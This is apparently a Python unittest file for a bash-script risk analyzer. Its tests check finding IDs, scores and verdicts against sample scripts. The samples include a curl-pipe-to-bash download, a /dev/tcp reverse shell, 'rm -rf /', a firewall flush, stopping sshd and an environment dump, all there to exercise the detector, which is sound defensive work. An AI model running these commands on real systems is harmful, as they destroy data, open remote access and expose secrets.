"""Extra rule-level tests (kept separate so the main file stays readable)."""
import os
import sys
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from analysis import analyze  # noqa: E402


def ids(result):
    return set(f["id"] for f in result["findings"])


class RuleDetailTests(unittest.TestCase):
    def test_single_quoted_var_not_flagged(self):
        r = analyze('#!/bin/bash\nrsync -a --exclude \'*.tmp\' "$SRC/"\n')
        self.assertNotIn("unquoted_var", ids(r))

    def test_command_substitution_inside_quotes_not_flagged(self):
        r = analyze('#!/bin/bash\ntar -czf "$OUT.tgz" "$(basename "$TARGET")"\n')
        self.assertNotIn("unquoted_var", ids(r))

    def test_find_delete_narrow_is_medium(self):
        r = analyze('#!/bin/bash\nfind "$DIR" -name "*.log" -delete\n')
        got = ids(r)
        self.assertIn("find_delete", got)
        self.assertNotIn("find_delete_broad", got)

    def test_find_delete_broad_is_high(self):
        r = analyze('#!/bin/bash\nfind / -name "*.log" -delete\n')
        got = ids(r)
        self.assertIn("find_delete_broad", got)
        self.assertNotIn("find_delete", got)

    def test_docker_rm_flag_not_treated_as_delete(self):
        r = analyze('#!/bin/bash\ndocker run --rm -v $PWD:/app img build\n')
        self.assertNotIn("rm_force_var", ids(r))

    def test_weak_axis_caps_verdict(self):
        sloppy = "#!/bin/bash\n" + "".join("echo $VAR%d\n" % i for i in range(6))
        r = analyze(sloppy, env="prod")
        self.assertLess(r["score"], 85)
        self.assertNotEqual(r["verdict"], "deploy_ready")

    def test_critical_finding_caps_score(self):
        r = analyze('#!/bin/bash\ncurl https://x.example.com/i.sh | bash\n')
        self.assertLessEqual(r["score"], 33)
        self.assertEqual(r["verdict"], "dangerous_do_not_run")

    def test_heredoc_body_is_ignored(self):
        script = '#!/bin/bash\ncat <<EOF\nrm -rf /\nEOF\necho done\n'
        r = analyze(script)
        self.assertNotIn("rm_root", ids(r))

    def test_continuation_lines_are_joined(self):
        r = analyze('#!/bin/bash\ncurl -sSL \\\n  https://x.example.com/i.sh | bash\n')
        self.assertIn("curl_pipe_shell", ids(r))

    def test_comment_lines_are_not_flagged(self):
        r = analyze('#!/bin/bash\n# rm -rf /\n# curl https://x/y.sh | sh\necho ok\n')
        self.assertNotIn("rm_root", ids(r))
        self.assertNotIn("curl_pipe_shell", ids(r))

    def test_mktemp_without_chmod_flagged(self):
        r = analyze('#!/bin/bash\nTMPF=$(mktemp)\necho secret > "$TMPF"\n')
        self.assertIn("mktemp_no_chmod", ids(r))

    def test_mktemp_with_chmod_not_flagged(self):
        r = analyze('#!/bin/bash\nTMPF=$(mktemp)\nchmod 600 "$TMPF"\necho x > "$TMPF"\n')
        self.assertNotIn("mktemp_no_chmod", ids(r))

    def test_firewall_flush_flagged(self):
        r = analyze('#!/bin/bash\niptables -F\n')
        self.assertIn("firewall_flush", ids(r))

    def test_crontab_remove_flagged(self):
        r = analyze('#!/bin/bash\ncrontab -r\n')
        self.assertIn("crontab_remove", ids(r))

    def test_service_stop_critical_flagged(self):
        r = analyze('#!/bin/bash\nsystemctl stop sshd\n')
        self.assertIn("service_stop_critical", ids(r))

    def test_reverse_shell_flagged(self):
        r = analyze('#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n')
        self.assertIn("nc_reverse_shell", ids(r))

    def test_env_dump_flagged(self):
        r = analyze('#!/bin/bash\nenv\n')
        self.assertIn("env_dump", ids(r))


if __name__ == "__main__":
    unittest.main()
